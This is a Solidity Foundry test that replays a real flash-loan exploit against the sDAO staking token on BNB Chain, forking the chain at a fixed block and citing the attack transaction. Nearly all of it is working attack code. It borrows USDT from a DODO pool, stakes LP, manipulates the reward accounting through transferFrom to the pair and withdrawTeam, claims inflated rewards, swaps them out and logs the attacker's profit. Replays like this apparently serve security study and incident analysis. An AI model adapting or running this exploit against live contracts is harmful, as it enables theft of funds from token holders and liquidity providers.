// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/8olidity/status/1594693686398316544
// https://twitter.com/CertiKAlert/status/1594615286556393478
// @TX
// https://bscscan.com/tx/0xb3ac111d294ea9dedfd99349304a9606df0b572d05da8cedf47ba169d10791ed

interface sDAO is IERC20 {
    function stakeLP(uint256 _lpAmount) external;
    function withdrawTeam(address _token) external;
    function getPerTokenReward() external view returns (uint256);
    function userLPStakeAmount(address account) external view returns (uint256);
    function userRewardPerTokenPaid(address account) external view returns (uint256);
    function totalStakeReward() external view returns (uint256);
    function lastTotalStakeReward() external view returns (uint256);
    function pendingToken(address account) external view returns (uint256);
    function getReward() external;
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    sDAO SDAO = sDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x333896437125fF680f146f18c8A164Be831C4C71);
    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_241_440);
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        SDAO.approve(address(Router), type(uint256).max);
        Pair.approve(address(Router), type(uint256).max);
        Pair.approve(address(SDAO), type(uint256).max);
        SDAO.approve(address(this), type(uint256).max);
        DVM(dodo).flashLoan(0, 500 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDTToSDAO();
        addUSDTsDAOLiquidity();
        SDAO.stakeLP(Pair.balanceOf(address(this)) / 2);
        // SDAO.transfer(address(Pair), SDAO.balanceOf(address(this)));
        SDAO.transferFrom(address(this), address(Pair), SDAO.balanceOf(address(this))); // change totalStakeReward > lastTotalStakeReward
        SDAO.withdrawTeam(address(Pair));
        Pair.transfer(address(SDAO), 13 * 1e15);
        // uint total = SDAO.totalStakeReward();
        // uint lasttotal =SDAO.lastTotalStakeReward();
        // uint stake = SDAO.userLPStakeAmount(address(this));
        // uint paid = SDAO.userRewardPerTokenPaid(address(this));
        // uint reward = SDAO.getPerTokenReward();
        // uint pending = SDAO.pendingToken(address(this));
        SDAO.getReward();
        SDAOToUSDT();
        USDT.transfer(dodo, 500 * 1e18);
    }

    function USDTToSDAO() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(SDAO);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            250 * 1e18, 0, path, address(this), block.timestamp + 60
        );
    }

    function addUSDTsDAOLiquidity() internal {
        Router.addLiquidity(
            address(USDT),
            address(SDAO),
            USDT.balanceOf(address(this)),
            SDAO.balanceOf(address(this)) / 2,
            0,
            0,
            address(this),
            block.timestamp + 60
        );
    }

    function SDAOToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(SDAO);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SDAO.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
        );
    }
}
